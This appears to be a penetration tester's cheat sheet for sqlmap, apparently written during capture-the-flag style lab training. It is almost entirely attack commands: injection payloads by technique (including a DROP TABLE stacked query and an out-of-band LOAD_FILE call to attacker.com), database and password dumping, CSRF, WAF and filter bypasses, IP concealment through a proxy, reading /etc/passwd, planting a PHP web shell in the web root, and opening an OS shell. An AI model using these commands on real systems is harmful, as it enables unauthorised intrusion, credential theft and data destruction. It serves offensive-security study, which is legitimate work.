```sqlmap
sqlmap -u 'http://IP:PORT/page.php?id=1'
```

[Hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap)
###### --techniques
- **`B`: Boolean-based blind**
	- AND 1=1
- **`E`: Error-based**
	- AND GTID_SUBSET(@@version,0)
- **`U`: Union query-based**
	- UNION ALL SELECT 1,@@version,3
- **`S`: Stacked queries**
	- ; DROP TABLE users
- **`T`: Time-based blind**
	- AND 1=IF(2>1,SLEEP(5),0)
- **`Q`: Inline queries**
	- SELECT (SELECT @@version) from
- **Out-of-band SQL Injection**
	- LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))

##### **CURL**
![[curl-sqlmap.png]]
```sqlmap
sqlmap <curl value>
```
# GET/POST Requests
```sqlmap
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

```sqlmap
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```
# Full HTTP Requests
```sqlmap
sqlmap -r request.txt
```
# Custom SQLMap Requests
###### Cookie
```sqlmap
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
or
```sqlmap
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```
###### API
```sqlmap
sqlmap -u www.target.com --data='id=1' --method PUT
```
# Custom HTTP Requests
###### JSON
```json
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

```sqlmap
sqlmap -r json_request.txt
```

# Handling SQLMap Errors
###### Display Errors
--parse-errors
###### Store the Traffic
```sqlmap
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```
###### Verbose Output
```sqlmap
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```
###### Using Proxy
--proxy
# Attack Tuning
###### Prefix/Suffix
```sqlmap
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```
###### Level/Risk
```sqlmap
sqlmap -u www.example.com/?id=1 -v 3 --level=5 --risk=3
```
# Advanced Tuning
###### Status Codes
TRUE: --code=200 | FLASE: --code=500
###### Titles
--titles
###### Strings
--string=success
###### Text-only
--text-only
###### Techniques
--technique
###### UNION SQLi Tuning
--union-cols=17
--union-char='a'
--union-from=users
# Database Enumeration
`--hostname`
`--current-user`
`--current-db`
`--passwords`
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```
###### Table Enumeration
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

```sqlmap
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb
```
###### Table/Row Enumeration
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

```sqlmap
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --start=2 --stop=3
```
###### Conditional Enumeration
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```
###### Full DB Enumeration
`--dump -D testdb`
`--dump-all`
`--exclude-sysdbs`
`--dump-all --exclude-sysdbs`
###### Dump Format
`--dump-format`
# Advanced Database Enumeration
###### Schema Enumeration
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --schema
```
###### Searching for Data
**Table**
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --search -T user
```
**Column**
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --search -C pass
```
###### Password Enumeration and Cracking
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

```sqlmap
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```
# Bypassing Web Application Protections
###### Anti-CSRF Token Bypass
```sqlmap
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```
###### Unique Value Bypass
```sqlmap
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

```sqlmap
sqlmap -u "http://94.237.53.113:58622/sqlmap.php?id=1&uid=123" --randomize=uid --batch --dump
```
###### Calculated Parameter Bypass
```sqlmap
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```
###### IP Address Concealing
`--proxy="socks4://177.39.187.70:33283"`
###### WAF Bypass
[identYwaf](https://github.com/stamparm/identYwaf)
`--skip-waf`
###### User-agent Blacklisting Bypass
`--random-agent`
```sqlmap
sqlmap -u 'http://STMIP:STMPO/sqlmap.php' --data="id=1" --random-agent --batch --dump
```
###### Tamper Scripts
`--tamper=between`
```sqlmap
sqlmap -u 'http://STMIP:STMPO/sqlmap.php?id=1' --tamper=between --batch --dump
```

| Tamper-Script             | Description                                                                                                                  |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| 0eunion                   | Replaces instances of UNION with e0UNION                                                                                     |
| base64encode              | Base64-encodes all characters in a given payload                                                                             |
| between                   | Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #                     |
| commalesslimit            | Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart                                                 |
| equaltolike               | Replaces all occurrences of operator equal (=) with LIKE counterpart                                                         |
| halfversionedmorekeywords | Adds (MySQL) versioned comment before each keyword                                                                           |
| modsecurityversioned      | Embraces complete query with (MySQL) versioned comment                                                                       |
| modsecurityzeroversioned  | Embraces complete query with (MySQL) zero-versioned comment                                                                  |
| percentage                | Adds a percentage sign (%) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)                                          |
| plus2concat               | Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart                                                        |
| randomcase                | Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)                                               |
| space2comment             | Replaces space character ( ) with comments `/                                                                                |
| space2dash                | Replaces space character ( ) with a dash comment (--) followed by a random string and a new line (\n)                        |
| space2hash                | Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n) |
| space2mssqlblank          | Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters     |
| space2plus                | Replaces space character ( ) with plus (+)                                                                                   |
| space2randomblank         | Replaces space character ( ) with a random blank character from a valid set of alternate characters                          |
| symboliclogical           | Replaces AND and OR logical operators with their symbolic counterparts (&& and \|\|)                                         |
| versionedkeywords         | Encloses each non-function keyword with (MySQL) versioned comment                                                            |
| versionedmorekeywords     | Encloses each keyword with (MySQL) versioned comment                                                                         |
# OS Exploitation
###### Reading Local Files
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```
###### Writing Local Files
**shell.php**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
**Write File**
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```
###### OS Command Execution
```sqlmap
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
##### Examples
```sqlmap
sqlmap 'http://94.237.61.218:59966' --data 'id=1*'
```
###### POST
```sqlmap
sqlmap 'http://94.237.61.218:59966' --data 'id=1*' --batch --technique U --dump
```
###### Cookie
```sqlmap
sqlmap 'http://94.237.61.218:59966' -H 'Cookie: id=*' --technique B --batch --dump
```
###### Level/Risk
```sqlmap
sqlmap -u 'http://94.237.61.197:59115/sqlmap.php?id=*' --level 5 --risk 3 -T flag5 --batch --dump
```
###### Prefix
```sqlmap
sqlmap -u 'http://STMIP:STMPO/sqlmap.php?col=id' --prefix='`)' --batch -T flag6 --dump
```
###### Technique
```sqlmap
sqlmap -u 'http://STMIP:STMPO/sqlmap.php?id=1' -T flag --technique=U --union-cols=5 --dump
```